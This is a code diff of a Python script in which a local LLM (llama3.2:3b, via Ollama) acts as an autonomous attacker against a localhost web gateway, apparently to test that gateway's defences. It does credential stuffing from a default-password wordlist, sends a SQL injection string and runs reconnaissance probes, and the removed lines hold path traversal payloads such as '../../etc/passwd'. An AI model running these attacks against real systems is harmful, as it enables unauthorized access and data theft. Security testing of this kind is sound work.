@@ -1,11 +1,19 @@
 """
-Component C: LLM-Driven Attacker Agent (attacker_agent.py)
-Powered by local Ollama (llama3.2:3b) to dynamically reason, generate, 
-and test URL interpretation payloads against the gateway, tracking complete statistics.
+Autonomous Black-Box LLM Attacker Agent (attacker_agent_v2.py)
+Fixes vs v1:
+  - login now sends JSON (site expects application/json, not form data)
+  - search uses the real 'q' parameter instead of the old 'file' param
+  - a wordlist of credentials is tried, not just admin/admin123
+  - every attempt is appended to attack_results.jsonl for metrics
+  - Ollama is asked to return JSON via format="json" (more reliable parsing)
+  - response bodies are truncated in the console so output stays readable
 """
 
-import time
 import json
+import time
+import uuid
+from datetime import datetime
+
 import httpx
 import ollama
 from rich.console import Console
@@ -13,115 +21,162 @@ from rich.panel import Panel
 
 console = Console()
 
-GATEWAY_URL = "http://127.0.0.1:8000/api/v1/download"
+BASE_URL = "http://127.0.0.1:8000"  # gateway, never the backend directly
 MODEL_NAME = "llama3.2:3b"
+USE_LLM = True
+RESULTS_FILE = "attack_results.jsonl"
+SLEEP_BETWEEN_STEPS = 1.5
 
-INITIAL_PAYLOADS = [
-    "reports/summary.pdf",
-    "../../etc/passwd",
-    "admin/config.json"
+CRED_WORDLIST = [
+    ("admin", "admin123"),
+    ("admin", "password"),
+    ("admin", "aegis123"),
+    ("root", "root"),
+    ("administrator", "admin"),
 ]
 
-def query_ollama_for_payload(history: list) -> str:
+
+def check_ollama_status() -> bool:
+    try:
+        ollama.list()
+        return True
+    except Exception:
+        return False
+
+
+def query_ollama_for_strategy(phase: str, history: list) -> dict:
+    if not USE_LLM:
+        return {"action": "probe", "endpoint": "/api/v1/search?q=classified"}
+
     prompt = (
-        "You are an offensive security researcher testing an AI defensive web gateway. "
-        "Your goal is to test boundary conditions, path traversal variations (e.g., encoded dots, null bytes), "
-        "and unauthorized route probing against an endpoint: /api/v1/download?file=<payload>.\n\n"
-        f"Previous attack history and responses:\n{json.dumps(history, indent=2)}\n\n"
-        "Provide ONLY the next single raw string value for the 'file' parameter to test. "
-        "Do not include markdown formatting, explanations, or extra text. Just output the payload string."
+        f"You are an autonomous offensive security black-box penetration tester.\n"
+        f"Current Attack Phase: {phase}\n"
+        f"Previous history and server responses:\n{json.dumps(history, indent=2)}\n\n"
+        "Choose the next action:\n"
+        "1. 'probe' a path (e.g. /api/v1/search?q=..., /api/v1/employees?limit=...)\n"
+        "2. 'login' with a credentials dict {'username':..., 'password':...}\n"
+        "3. 'exploit' an endpoint with a payload string meant to look like SQL "
+        "injection or similar, placed in the 'payload' field\n\n"
+        'Return ONLY a JSON object: {"action": "...", "endpoint": "...", '
+        '"payload": "...", "credentials": {...}}. Omit keys you do not need. '
+        "No markdown, no extra text."
     )
-    
     try:
         response = ollama.chat(
             model=MODEL_NAME,
             messages=[{"role": "user", "content": prompt}],
-            options={"temperature": 0.7}
+            options={"temperature": 0.7},
+            format="json",
         )
-        payload = response['message']['content'].strip().strip('"').strip("'")
-        return payload
+        return json.loads(response["message"]["content"].strip())
     except Exception as e:
-        console.print(f"[bold red][LLM ERROR] Ollama failed to generate payload: {e}[/bold red]")
-        return "../../etc/passwd"
+        console.print(f"[bold red][LLM ERROR] {e}[/bold red]")
+        return {"action": "probe", "endpoint": "/api/v1/search?q=classified"}
 
-def run_llm_attacker_simulation():
-    console.print(f"[bold magenta][ATTACKER] Initializing LLM Attacker Agent via Ollama ({MODEL_NAME})...[/bold magenta]")
-    
-    stats = {
-        "total_attacks": 0,
-        "successful_bypasses": 0,
-        "blocked_attempts": 0,
-        "errors": 0,
-        "total_latency_ms": 0.0
-    }
-    
+
+def log_result(record: dict) -> None:
+    with open(RESULTS_FILE, "a", encoding="utf-8") as f:
+        f.write(json.dumps(record) + "\n")
+
+
+def run_blackbox_attacker():
+    run_id = uuid.uuid4().hex[:8]
+    console.print(f"[bold cyan][BLACK-BOX AGENT] Run {run_id} starting against {BASE_URL}[/bold cyan]")
+
+    if USE_LLM and not check_ollama_status():
+        console.print("[bold red][ERROR] Ollama is not running. Run 'ollama serve' first.[/bold red]")
+        return
+
     attack_history = []
-    
-    for step in range(1, 6):
-        stats["total_attacks"] += 1
-        
-        if step <= len(INITIAL_PAYLOADS):
-            payload = INITIAL_PAYLOADS[step - 1]
-            console.print(f"\n[yellow][ATTACKER] Step {step} | Seed Payload: {payload}[/yellow]")
+    session_cookies = {}
+    auth_token = None
+
+    # Bootstrapped steps first (recon + credential stuffing), then LLM-driven.
+    steps = [
+        ("RECONNAISSANCE", {"action": "probe", "endpoint": "/openapi.json"}),
+        ("RECONNAISSANCE", {"action": "probe", "endpoint": "/api/v1/employees?limit=500"}),
+    ]
+    for user, pwd in CRED_WORDLIST:
+        steps.append(("AUTHENTICATION", {"action": "login", "endpoint": "/api/v1/login",
+                                          "credentials": {"username": user, "password": pwd}}))
+    steps.append(("EXPLOIT", {"action": "exploit", "endpoint": "/api/v1/search",
+                               "payload": "' OR '1'='1"}))
+    steps.append(("EXPLOIT_LLM", None))
+    steps.append(("EXPLOIT_LLM", None))
+
+    for step, (phase, fixed_move) in enumerate(steps, start=1):
+        timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
+        console.print(f"\n[yellow]==== PHASE: {phase} | STEP #{step} [{timestamp}] ====[/yellow]")
+
+        if fixed_move is not None:
+            move = fixed_move
         else:
-            console.print(f"\n[cyan][ATTACKER] Step {step} | Querying Ollama ({MODEL_NAME}) for adaptive variant...[/cyan]")
-            payload = query_ollama_for_payload(attack_history)
-            console.print(f"[yellow][ATTACKER] LLM Generated Payload: {payload}[/yellow]")
-        
-        target_endpoint = f"{GATEWAY_URL}?file={payload}"
+            console.print("[cyan][AGENT] Querying Ollama for next move...[/cyan]")
+            move = query_ollama_for_strategy(phase, attack_history[-5:])
+
+        action = move.get("action", "probe")
+        endpoint = move.get("endpoint", "/")
+        target_url = f"{BASE_URL}{endpoint}"
+
         start_time = time.perf_counter()
-        
+        response = None
         try:
-            response = httpx.get(target_endpoint, timeout=5.0)
-            elapsed_ms = (time.perf_counter() - start_time) * 1000
-            stats["total_latency_ms"] += elapsed_ms
-            
-            result_entry = {
-                "step": step,
-                "payload": payload,
-                "status_code": response.status_code,
-                "response_snippet": response.text[:150]
-            }
-            attack_history.append(result_entry)
-            
-            if response.status_code == 200:
-                stats["successful_bypasses"] += 1
-                console.print(f"[bold green][ATTACKER SUCCESS] Gateway bypassed! Status: 200 OK | Latency: {elapsed_ms:.2f}ms[/bold green]")
-                if "root:" in response.text or "CONFIDENTIAL" in response.text:
-                    console.print(f"[bold red][EXFILTRATION SUCCESS] Sensitive data successfully harvested from target: {response.text[:80].strip()}...[/bold red]")
-                else:
-                    console.print(f"[dim]Data snippet: {response.text[:100]}...[/dim]")
-            elif response.status_code == 403:
-                stats["blocked_attempts"] += 1
-                console.print(f"[bold red][DEFENSE SUCCESS] Gateway blocked payload! Status: 403 Forbidden | Latency: {elapsed_ms:.2f}ms[/bold red]")
-                try:
-                    data = response.json()
-                    console.print(f"[dim]Block Reason: {data.get('reason')} | Gateway Inspection Latency: {data.get('latency_ms')}ms[/dim]")
-                except Exception:
-                    pass
-            else:
-                stats["errors"] += 1
-                console.print(f"[yellow][INFO] Status code: {response.status_code} | Latency: {elapsed_ms:.2f}ms[/yellow]")
-                
+            if action == "login":
+                creds = move.get("credentials", {"username": "admin", "password": "admin123"})
+                console.print(f"[magenta][RED TEAM] Login attempt -> {creds.get('username')}[/magenta]")
+                response = httpx.post(target_url, json=creds, timeout=5.0)
+                if response.status_code == 200:
+                    session_cookies = dict(response.cookies)
+                    try:
+                        auth_token = response.json().get("access_token")
+                    except Exception:
+                        auth_token = None
+                    console.print("[bold green][AUTH SUCCESS][/bold green]")
+
+            elif action == "exploit":
+                payload = move.get("payload", "")
+                sep = "&" if "?" in endpoint else "?"
+                target_url = f"{target_url}{sep}q={httpx.QueryParams({'q': payload}).get('q')}" if payload else target_url
+                headers = {"Authorization": f"Bearer {auth_token}"} if auth_token else {}
+                console.print(f"[magenta][RED TEAM] Exploit probe -> {target_url}[/magenta]")
+                response = httpx.get(target_url, cookies=session_cookies, headers=headers, timeout=5.0)
+
+            else:  # probe
+                headers = {"Authorization": f"Bearer {auth_token}"} if auth_token else {}
+                console.print(f"[magenta][RED TEAM] Probing -> {target_url}[/magenta]")
+                response = httpx.get(target_url, cookies=session_cookies, headers=headers, timeout=5.0)
+
+            elapsed_ms = round((time.perf_counter() - start_time) * 1000, 2)
+            snippet = response.text[:200]
+
+            attack_history.append({
+                "step": step, "action": action, "endpoint": endpoint,
+                "status_code": response.status_code, "response_snippet": snippet,
+            })
+            log_result({
+                "run_id": run_id, "step": step, "phase": phase, "action": action,
+                "endpoint": endpoint, "status_code": response.status_code,
+                "latency_ms": elapsed_ms, "ts": timestamp,
+            })
+
+            colour = "green" if response.status_code == 200 else ("red" if response.status_code in (401, 403, 404) else "yellow")
+            console.print(Panel(
+                f"[bold cyan]Status:[/bold cyan] [{colour}]{response.status_code}[/{colour}]  "
+                f"[bold cyan]Latency:[/bold cyan] {elapsed_ms} ms\n"
+                f"[bold cyan]URL:[/bold cyan] {target_url}\n"
+                f"[bold yellow]Response (truncated):[/bold yellow] {snippet}",
+                title=f"TRY #{step} RESULT", border_style=colour,
+            ))
+
         except httpx.RequestError as exc:
-            stats["errors"] += 1
-            console.print(f"[bold red][ERROR] Connection failed: {exc}[/bold red]")
-            
-        time.sleep(2.0)
+            console.print(f"[bold red][ERROR] {exc}[/bold red]")
+            log_result({"run_id": run_id, "step": step, "phase": phase, "action": action,
+                        "endpoint": endpoint, "status_code": None, "error": str(exc), "ts": timestamp})
 
-    avg_latency = stats["total_latency_ms"] / stats["total_attacks"] if stats["total_attacks"] > 0 else 0
-    block_percentage = (stats["blocked_attempts"] / stats["total_attacks"]) * 100 if stats["total_attacks"] > 0 else 0
+        time.sleep(SLEEP_BETWEEN_STEPS)
 
-    report = (
-        f"[cyan]Total Autonomous Probes:[/cyan] {stats['total_attacks']}\n"
-        f"[red]Blocked by Defensive Gateway:[/red] {stats['blocked_attempts']} ({block_percentage:.1f}% Defense Efficacy)\n"
-        f"[green]Successful Bypasses:[/green] {stats['successful_bypasses']}\n"
-        f"[yellow]Errors / Timeouts:[/yellow] {stats['errors']}\n"
-        f"[magenta]Average Round-Trip Latency:[/magenta] {avg_latency:.2f} ms"
-    )
-    
-    console.print(Panel(report, title="📊 LLM Attacker Agent Statistical Summary Report", expand=False))
+    console.print(f"[bold green][BLACK-BOX AGENT] Run {run_id} complete. Results appended to {RESULTS_FILE}[/bold green]")
+
 
 if __name__ == "__main__":
-    run_llm_attacker_simulation()
-    #curl "http://127.0.0.1:8000/admin/toggle-security?enable=true"
+    run_blackbox_attacker()
